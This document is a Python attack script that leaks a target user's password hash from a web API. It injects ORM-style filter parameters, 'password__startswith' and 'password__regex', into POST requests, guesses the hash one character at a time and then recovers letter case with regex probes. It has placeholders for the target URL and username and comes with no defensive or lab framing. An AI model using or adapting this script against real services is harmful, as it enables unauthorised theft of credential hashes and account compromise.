import requests
import string

# Configuration
BASE_URL = "https://api-example.me/api/user/" #Change this
HEADERS = {"Content-Type": "application/json"}
USERNAME = "" #Change this

# Characters that might be in the hash
HASH_CHARACTERS = string.ascii_letters + string.digits + "=+$_/"

def generate_regex(hash_value, current_index=None):
    pattern = ""
    for i, char in enumerate(hash_value):
        if char.isalpha() and i != current_index:
            pattern += f"[{char.lower()}{char.upper()}]"
        elif char in "_$+/=":
            pattern += f"\\{char}"
        else:
            pattern += char
    return pattern

def test_regex(hash_value):
    correct_hash = hash_value
    for i in range(len(hash_value)):
        if hash_value[i].isalpha():
            for case_char in [hash_value[i].lower(), hash_value[i].upper()]:
                test_hash = correct_hash[:i] + case_char + correct_hash[i+1:]
                regex = generate_regex(test_hash, i)
                payload = {
                    "id": "2",
                    "password__regex": f"^{regex}"
                }
                print(f"Trying regex: ^{regex}")
                response = requests.post(BASE_URL, json=payload, headers=HEADERS)
                
                print(f"Response status: {response.status_code}")
                print(f"Response content: {response.text}")
                
                if response.status_code == 200:
                    response_json = response.json()
                    if isinstance(response_json, list) and len(response_json) > 0:
                        correct_hash = test_hash
                        print(f"Current correct hash: {correct_hash}")
                        break
            else:
                print(f"No match found for character at position {i}, using original")
        else:
            print(f"Skipping non-alphabetic character: {hash_value[i]}")

    return correct_hash

def leak_hash():
    """
    Reconstruct the base hash using the startswith method.
    """
    hash_value = ""
    while True:
        for char in HASH_CHARACTERS:
            payload = {"username": USERNAME, "password__startswith": hash_value + char}
            response = requests.post(BASE_URL, json=payload, headers=HEADERS)

            if response.status_code != 200:
                print(f"Error: Received status code {response.status_code}")
                continue

            # Log the response for diagnostics
            print(f"Testing: {hash_value + char} | Response: {response.text}")

            try:
                response_json = response.json()
            except ValueError:
                print("Error: Response is not valid JSON")
                continue

            # Check if the response contains the required indicator
            if isinstance(response_json, list):
                if any(item.get("username") == USERNAME for item in response_json):
                    hash_value += char
                    print(f"Current hash: {hash_value}")
                    break
            elif isinstance(response_json, dict):
                if "password" in response_json.get("details", ""):
                    hash_value += char
                    print(f"Current hash: {hash_value}")
                    break
        else:
            # If all characters are tested and no match is found, the hash is complete
            return hash_value

if __name__ == "__main__":
    print("Leaking initial hash...")
    initial_hash = leak_hash()
    print(f"Initial hash: {initial_hash}")

    print("\nGenerating refined regex...")
    refined_hash = test_regex(initial_hash)
    print(f"Final regex: {generate_regex(refined_hash)}")
    print(f"Final refined hash: {refined_hash}")
